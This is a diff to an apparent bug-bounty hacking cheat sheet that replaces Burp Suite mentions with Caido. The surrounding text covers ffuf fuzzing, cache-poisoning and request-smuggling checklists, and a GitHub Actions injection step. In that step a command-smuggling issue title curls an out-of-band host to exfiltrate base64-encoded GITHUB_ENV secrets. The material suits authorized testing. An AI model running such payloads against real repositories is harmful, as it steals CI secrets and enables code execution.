@@ -232,7 +232,7 @@ cat semgrep-results.json | jq '.results[] | select(.extra.severity == "ERROR") |
 # THE ONE RULE: Always use -ac (auto-calibrate filters noise automatically)
 ffuf -w wordlist.txt -u https://target.com/FUZZ -ac
 
-# Authenticated raw request file — IDOR testing (save Burp request to req.txt, replace ID with FUZZ)
+# Authenticated raw request file — IDOR testing (save Caido request to req.txt, replace ID with FUZZ)
 seq 1 10000 | ffuf --request req.txt -w - -ac
 
 # Authenticated API endpoint brute
@@ -756,14 +756,14 @@ When target has AI agents with tool access, these are the 10 attack classes:
 - [ ] Parameter cloaking (`?param=value;poison=xss`)
 - [ ] Fat GET (body params on GET requests)
 - [ ] Web cache deception (`/account/settings.css` -- trick cache into storing private response)
-- [ ] Param Miner (Burp extension) -- auto-discovers unkeyed headers
+- [ ] Param Miner (Caido plugin) -- auto-discovers unkeyed headers
 
 ## HTTP Request Smuggling
 - [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
 - [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
 - [ ] H2.CL: HTTP/2 downgrade smuggling
 - [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
-- [ ] Use Burp "HTTP Request Smuggler" extension -- detects automatically
+- [ ] Use Caido "HTTP Request Smuggler" extension -- detects automatically
 
 ### CL.TE Example
 ```http
@@ -976,7 +976,7 @@ github.head_ref
 
 ```bash
 # Step 1: Create an issue with injection payload in title
-gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"
+gh issue create --repo TARGET/REPO --title '"; curl https://oast.fun/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"
 
 # Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
 # CVSS: 9.3 Critical (RCE with repo secrets)
@@ -1403,7 +1403,7 @@ Title: [Vuln Class] in [endpoint/feature] leads to [Impact]
 
 ## Supporting Material
 [Screenshot / video of exploitation]
-[Burp Suite request/response]
+[Caido request/response]
 
 ## Impact
 An attacker can [specific action] resulting in [specific harm].
